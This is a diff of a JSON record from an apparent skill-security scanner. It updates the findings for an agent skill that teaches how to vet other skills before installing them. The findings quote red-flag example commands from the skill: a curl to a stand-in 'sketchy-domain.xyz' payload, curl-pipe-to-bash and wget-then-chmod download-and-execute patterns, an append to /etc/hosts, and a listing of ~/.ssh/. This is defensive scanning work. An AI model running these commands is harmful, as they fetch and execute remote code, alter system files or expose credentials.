@@ -3,25 +3,107 @@
   "owner": "LeoYeAI",
   "repo": "agent-master-skills",
   "path": "skills/nyx-archive-skill-security-protocol",
-  "name": "nyx-archive-skill-security-protocol",
-  "description": "",
-  "stars": 2192,
-  "category": "coding",
-  "commit": "671b70de331b75d0ceaa4d4ba06e03f1b4f80b22",
+  "name": "skill-security-protocol",
+  "description": "Teach your AI agent to think about security. A reasoning methodology for vetting skills before installation — red/green flag heuristics, 4-phase audit protocol, post-install verification. No scripts, no dependencies. Just judgment. Built on fallibilism (being wrong about a skill's safety is recoverable; being overconfident is not) and relational security (you and your human decide together on edge cases — trust is built through transparency, not just detection).",
+  "stars": 2210,
+  "category": "security",
+  "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
   "contentHash": "6487761be7ff65561a2b7be9dccf5f393d8b97037493d8bd6735d50c81071c49",
   "repoCreatedAt": "2026-03-02T02:02:25Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-15T10:00:32.478Z",
+  "scannedAt": "2026-11-20T10:39:23.037Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 78,
+        "excerpt": "clawhub search \"<topic>\"                    # Find candidates",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 102,
+        "excerpt": "| **Shell scripts modifying system files** | Can alter configs, SSH keys, firewall rules | `echo >> /etc/hosts` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 103,
+        "excerpt": "| **Network requests to unknown endpoints** | Data exfiltration, C2 communication | `curl http://sketchy-domain.xyz/payload` |",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "sketchy-domain.xyz"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 108,
+        "excerpt": "| **Download and execute patterns** | Classic malware delivery | `curl ... \\| bash`, `wget && chmod +x` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 152,
+        "excerpt": "clawhub install <skill-name>",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 182,
+        "excerpt": "ps aux | head -20",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 191,
+        "excerpt": "ls -la ~/.ssh/",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 325,
+        "excerpt": "ps aux | grep -v \"^\\[\" | head -30",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/nyx-archive-skill-security-protocol/SKILL.md",
+        "line": 391,
+        "excerpt": "clawhub list                    # What's installed?",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 5,
+      "writes-outside": 1,
+      "network": 1,
+      "downloads-code": 1,
+      "reads-secrets": 1
+    },
+    "score": 59,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 2
+    "filesScanned": 1,
+    "filesSkipped": 1
   },
   "history": [
     {
@@ -40,6 +122,12 @@
       "commit": "671b70de331b75d0ceaa4d4ba06e03f1b4f80b22",
       "scannedAt": "2026-11-15T10:00:32.478Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "90f95204adef528b4248213d7d78e0b62af4c497",
+      "scannedAt": "2026-11-20T10:39:23.037Z",
+      "score": 59,
       "rulesVersion": "1.3.0"
     }
   ]
